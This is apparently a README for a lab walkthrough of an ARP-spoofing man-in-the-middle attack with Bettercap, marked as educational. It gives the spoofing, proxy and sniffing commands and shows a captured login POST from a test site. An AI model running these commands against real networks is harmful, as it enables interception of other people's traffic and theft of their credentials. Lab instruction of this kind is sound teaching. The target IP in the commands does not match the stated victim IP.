# ARP-MITM-Bettercap
MITM Attack using ARP Spoofing with Bettercap (Educational Purpose Only)  

## LAB SET-UP
### 💻 Attacker Machine

**OS**: Kali Linux 2024.1  

**Tool Used**: Bettercap  

**IP Address**: 192.168.1.5  

**Role**: Perform ARP spoofing, sniff HTTP traffic

### 🖥️ Victim Machine

**OS**: Ubuntu or Windows 10   

**Browser**: Firefox / Chrome  

**IP Address**: 192.168.1.10  

**Role**: Target of the attack, visiting HTTP websites

### 🌐 Network Setup

**Type**: Bridged Adapter (VirtualBox)  

**Interface**: `eth0` (for attacker)  

**Same Local Network**: Yes ✅   

1. **Start Bettercap:**
    ```bash
    sudo bettercap -iface eth0
    ```

2. **Scan Network:**
    ```bash
    net.probe on
    net.show
    ```

3. **Set Victim IP:**
    ```bash
    set arp.spoof.targets 192.168.94.171
    ```

4. **Launch Attack:**
    ```bash
    arp.spoof on
    http.proxy on
    net.sniff on
    ```

5. **Ask victim to visit:**
   ### use http website...
   **Example:**
    ```
    http://testphp.vulnweb.com/login.php
    ```

7. **Captured Output:**
    ```
    POST /userinfo.php uname=loc&pass=mor
    ```
---

## 📄 License
MIT

